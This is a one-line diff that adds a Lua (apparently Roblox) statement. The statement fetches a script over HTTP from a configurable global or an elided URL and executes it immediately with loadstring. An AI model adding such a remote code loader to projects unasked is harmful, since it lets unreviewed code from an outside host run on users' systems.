@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(_G.VOX_ENTRY or ".../init.lua"))()
